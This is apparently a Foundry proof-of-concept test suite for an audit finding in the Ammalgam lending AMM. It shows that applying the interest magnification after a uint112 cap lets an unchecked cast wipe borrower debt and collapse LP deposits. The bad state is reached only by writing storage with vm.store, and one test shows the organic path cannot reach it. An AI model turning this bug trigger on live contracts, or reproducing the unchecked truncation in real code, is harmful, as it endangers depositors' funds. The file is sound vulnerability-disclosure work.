// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";

/// @dev Minimal interfaces for fork PoC against deployed factory/pair.
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function deposit(address to) external;
    function borrowLiquidity(address to, uint256 borrowAmountLAssets, bytes calldata data)
        external
        returns (uint256, uint256);
    function sync() external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function underlyingTokens() external view returns (address, address);
    function totalAssetsAndShares(bool withInterest)
        external
        view
        returns (uint112[6] memory assets, uint112[6] memory shares);
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Pure reproduction of Interest.sol L-magnification-after-cap truncation.
library InterestTruncationMath {
    uint256 internal constant WAD = 1e18;
    uint256 internal constant LIQUIDITY_INTEREST_RATE_MAGNIFICATION = 5;
    uint256 internal constant OPTIMAL_UTILIZATION = 0.8e18;
    uint256 internal constant DANGER_UTILIZATION = 0.925e18;
    uint256 internal constant SLOPE1 = 0.1e18;
    uint256 internal constant SLOPE2 = 2e18;
    uint256 internal constant SLOPE3 = 20e18;
    uint256 internal constant BASE_OPTIMAL_UTILIZATION = 0.08e18;
    uint256 internal constant BASE_DANGER_UTILIZATION = 0.33e18;
    uint256 internal constant SECONDS_IN_YEAR = 365 days;
    uint256 internal constant MAX_UINT112 = type(uint112).max;

    function wMulDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / WAD;
    }

    function wTaylorCompounded(uint256 x, uint256 n) internal pure returns (uint256) {
        uint256 firstTerm = x * n;
        uint256 secondTerm = mulDiv(firstTerm, firstTerm, 2 * WAD, false);
        uint256 thirdTerm = mulDiv(secondTerm, firstTerm, 3 * WAD, false);
        return firstTerm + secondTerm + thirdTerm;
    }

    function mulDiv(uint256 a, uint256 b, uint256 c, bool roundingUp) internal pure returns (uint256) {
        uint256 prod = a * b;
        if (roundingUp) return prod == 0 ? 0 : (prod - 1) / c + 1;
        return prod / c;
    }

    function getAnnualInterestRatePerSecondInWads(uint256 utilizationInWads) internal pure returns (uint256 interestRate) {
        if (utilizationInWads <= OPTIMAL_UTILIZATION) {
            interestRate = wMulDown(utilizationInWads, SLOPE1);
        } else if (utilizationInWads <= DANGER_UTILIZATION) {
            interestRate = wMulDown(utilizationInWads - OPTIMAL_UTILIZATION, SLOPE2) + BASE_OPTIMAL_UTILIZATION;
        } else {
            interestRate = wMulDown(utilizationInWads - DANGER_UTILIZATION, SLOPE3) + BASE_DANGER_UTILIZATION;
        }
        interestRate /= SECONDS_IN_YEAR;
    }

    /// @dev Exact Interest.sol order: cap in computeInterestAssetsGivenRate, THEN *5 for L.
    function computeCappedThenMagnifiedLInterest(
        uint256 duration,
        uint256 borrowedAssets,
        uint256 depositedAssets,
        uint256 utilizationInWads
    ) internal pure returns (uint256 capped, uint256 magnified, uint256 room) {
        uint256 rateInWads = getAnnualInterestRatePerSecondInWads(utilizationInWads);
        uint256 raw = mulDiv(wTaylorCompounded(rateInWads, duration), borrowedAssets, WAD, false);
        room = MAX_UINT112 - (depositedAssets > borrowedAssets ? depositedAssets : borrowedAssets);
        capped = raw < room ? raw : room;
        magnified = LIQUIDITY_INTEREST_RATE_MAGNIFICATION * capped;
    }

    function addInterestToAssetsTruncating(uint256 prevAssets, uint256 interest) internal pure returns (uint112) {
        unchecked {
            return uint112(prevAssets + interest);
        }
    }
}

/**
 * @title InterestTruncationTest
 * @notice Proves LIQUIDITY_INTEREST_RATE_MAGNIFICATION (5) is applied AFTER the uint112 headroom
 *         cap, so unchecked addInterestToAssets can truncate BORROW_L (and thus DEPOSIT_L).
 *
 * Storage layout (TokenController on pair proxy), verified on fork:
 *   allShares @ slots 10-12, allAssets @ slots 13-15
 *   slot 14 = [DEPOSIT_Y | BORROW_L]  (low 112 | high 112)
 *   slot 11 = [DEPOSIT_Y_shares | BORROW_L_shares]
 */
contract InterestTruncationTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;

    uint256 constant MAX112 = type(uint112).max;
    uint256 constant ASSETS_SLOT_DEPOSIT_Y_BORROW_L = 14;
    uint256 constant SHARES_SLOT_DEPOSIT_Y_BORROW_L = 11;

    // -------------------------------------------------------------------------
    // 1) Pure math: concrete numbers proving truncation
    // -------------------------------------------------------------------------

    function test_pureMath_magnificationAfterCap_truncatesBorrowL() public pure {
        // Concrete near-cap balances (same shape as on-chain L accounting:
        // DEPOSIT_L = activeLiquidity + BORROW_L).
        uint256 active = 1e24;
        uint256 headroom = 1e30; // room below uint112.max for deposit
        uint256 borrowL = MAX112 - active - headroom;
        uint256 depositL = active + borrowL; // == MAX112 - headroom
        assertEq(depositL, MAX112 - headroom);

        // High L utilization (~100%).
        uint256 util = (borrowL * 1e18 + depositL - 1) / depositL;
        assertGt(util, 0.99e18);

        // Duration long enough that raw interest hits the headroom cap.
        uint256 duration = 2 hours;
        (uint256 capped, uint256 magnified, uint256 room) =
            InterestTruncationMath.computeCappedThenMagnifiedLInterest(duration, borrowL, depositL, util);

        assertEq(room, headroom, "room == headroom");
        assertEq(capped, headroom, "raw interest must hit uint112 headroom cap");
        assertEq(magnified, 5 * headroom, "magnification applied AFTER cap");

        // Safe expected (if mag were inside the cap): borrow + headroom <= MAX112
        assertLe(borrowL + headroom, MAX112, "pre-mag add would fit in uint112");

        // Actual path: borrow + 5*capped overflows uint112 and truncates.
        uint256 fullSum = borrowL + magnified;
        assertGt(fullSum, MAX112, "post-mag sum overflows uint112");

        uint112 truncated = InterestTruncationMath.addInterestToAssetsTruncating(borrowL, magnified);
        assertEq(uint256(truncated), fullSum % (MAX112 + 1), "uint112 cast truncates");
        assertLt(uint256(truncated), borrowL, "BORROW_L shrinks after truncation");

        // DEPOSIT_L is rebuilt as active + newBorrowL → LP claimable L collapses.
        uint256 newDepositL = active + uint256(truncated);
        assertLt(newDepositL, depositL, "DEPOSIT_L collapses with BORROW_L");

        // borrowL + 5*headroom = MAX112 - active + 4*headroom
        // mod 2^112 = 4*headroom - active - 1
        assertEq(uint256(truncated), 4 * headroom - active - 1);
        assertEq(newDepositL, 4 * headroom - 1);
    }

    function test_pureMath_xyPathDoesNotMagnifyAfterCap() public pure {
        // Control: X/Y interest is capped then added WITHOUT *5, so unchecked add is safe.
        uint256 borrowX = MAX112 - 1e30;
        uint256 depositX = borrowX;
        uint256 capped = MAX112 - depositX;
        uint112 after_ = InterestTruncationMath.addInterestToAssetsTruncating(borrowX, capped);
        assertEq(uint256(after_), MAX112, "X/Y path saturates at max, no wrap");
    }

    // -------------------------------------------------------------------------
    // 2) Fork: public sync() after vm.store places BORROW_L near the cap
    // -------------------------------------------------------------------------

    /**
     * @dev DOCUMENTATION — cheatcode precondition:
     *   Organic growth cannot place BORROW_L near uint112.max (see sibling test).
     *   We vm.store allAssets[BORROW_L] (and matching shares) into the overflow-prone
     *   region, then trigger accrual ONLY via the public sync() entrypoint.
     */
    function test_fork_sync_truncation_viaVmStore() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));

        MockERC20 tokenA = new MockERC20("A", "A", 18);
        MockERC20 tokenB = new MockERC20("B", "B", 18);
        address p = IFactory(FACTORY).createPair(address(tokenA), address(tokenB));
        IAmmalgamPair pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        MockERC20 assetX = MockERC20(px);
        MockERC20 assetY = MockERC20(py);

        uint256 seed = 1e24;
        assetX.mint(address(this), seed);
        assetY.mint(address(this), seed);
        assetX.transfer(p, seed);
        assetY.transfer(p, seed);
        pair.mint(address(this));

        (uint112[6] memory assets0,) = pair.totalAssetsAndShares(false);
        // With BORROW_L=0, DEPOSIT_L == active liquidity ≈ sqrt(rx*ry).
        uint256 active = uint256(assets0[0]);
        assertGt(active, 0);
        assertEq(uint256(assets0[3]), 0, "BORROW_L starts at 0");

        uint256 headroom = 1e30;
        uint256 targetBorrowL = MAX112 - active - headroom;
        uint256 targetDepositL = active + targetBorrowL; // MAX112 - headroom

        // Pack BORROW_L into high-112 of slot 14; keep existing DEPOSIT_Y in low-112.
        _writeHigh112(p, ASSETS_SLOT_DEPOSIT_Y_BORROW_L, uint112(targetBorrowL));
        // Keep shares/assets ratio ~1 so fee mint math stays well-defined.
        _writeHigh112(p, SHARES_SLOT_DEPOSIT_Y_BORROW_L, uint112(targetBorrowL));

        (uint112[6] memory verify, uint112[6] memory verifyShares) = pair.totalAssetsAndShares(false);
        console2.log("BORROW_L after store", uint256(verify[3]));
        console2.log("DEPOSIT_L after store", uint256(verify[0]));
        console2.log("BORROW_L shares", uint256(verifyShares[3]));
        assertEq(uint256(verify[3]), targetBorrowL, "vm.store set BORROW_L");
        assertEq(uint256(verify[0]), targetDepositL, "DEPOSIT_L = active + BORROW_L");

        uint256 borrowBefore = uint256(verify[3]);
        uint256 depositBefore = uint256(verify[0]);

        // Warp long enough for raw L interest to hit the headroom cap at ~100% util.
        vm.warp(block.timestamp + 2 hours);

        // Trigger accrual through the public entrypoint only.
        pair.sync();

        (uint112[6] memory afterAssets,) = pair.totalAssetsAndShares(false);
        uint256 borrowAfter = uint256(afterAssets[3]);
        uint256 depositAfter = uint256(afterAssets[0]);

        console2.log("BORROW_L before", borrowBefore);
        console2.log("BORROW_L after ", borrowAfter);
        console2.log("DEPOSIT_L before", depositBefore);
        console2.log("DEPOSIT_L after ", depositAfter);

        // Expected wrap from pure math (same numbers).
        uint256 expectedBorrow = 4 * headroom - active - 1;
        assertEq(borrowAfter, expectedBorrow, "BORROW_L truncated to wrapped value");
        assertLt(borrowAfter, borrowBefore, "borrower debt shrinks");
        assertLt(depositAfter, depositBefore, "LP claimable DEPOSIT_L collapses");

        console2.log("IMPACT: debt wiped; DEPOSIT_L collapsed via public sync()");
    }

    function test_fork_organicPath_cannotReachCapInReasonableTime() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));

        MockERC20 tokenA = new MockERC20("A", "A", 18);
        MockERC20 tokenB = new MockERC20("B", "B", 18);
        address p = IFactory(FACTORY).createPair(address(tokenA), address(tokenB));
        IAmmalgamPair pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        MockERC20 assetX = MockERC20(px);
        MockERC20 assetY = MockERC20(py);

        uint256 seed = 1e24;
        assetX.mint(address(this), seed * 100);
        assetY.mint(address(this), seed * 100);
        assetX.transfer(p, seed);
        assetY.transfer(p, seed);
        pair.mint(address(this));

        address user = makeAddr("user");
        uint256 coll = seed * 50;
        assetX.mint(user, coll);
        assetY.mint(user, coll);
        vm.startPrank(user);
        assetX.transfer(p, coll / 2);
        assetY.transfer(p, coll / 2);
        pair.deposit(user);

        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 borrowLAmt = uint256(rx) < uint256(ry) ? uint256(rx) / 5 : uint256(ry) / 5;
        try pair.borrowLiquidity(user, borrowLAmt, "") {
            console2.log("borrowLiquidity ok", borrowLAmt);
        } catch {
            console2.log("borrowLiquidity reverted; continuing with whatever BORROW_L exists");
        }
        vm.stopPrank();

        (uint112[6] memory a0,) = pair.totalAssetsAndShares(false);
        console2.log("organic BORROW_L", uint256(a0[3]));

        for (uint256 i; i < 10; i++) {
            vm.warp(block.timestamp + 365 days);
            try pair.sync() {} catch {}
        }
        (uint112[6] memory a1,) = pair.totalAssetsAndShares(false);
        console2.log("after 10y BORROW_L", uint256(a1[3]));
        console2.log("uint112.max", MAX112);
        assertLt(uint256(a1[3]) * 1000, MAX112, "organic BORROW_L << uint112.max even after 10y");
    }

    function _writeHigh112(address target, uint256 slot, uint112 value) internal {
        uint256 w = uint256(vm.load(target, bytes32(slot)));
        uint256 mask = ((uint256(1) << 112) - 1) << 112;
        w = (w & ~mask) | (uint256(value) << 112);
        vm.store(target, bytes32(slot), bytes32(w));
    }
}
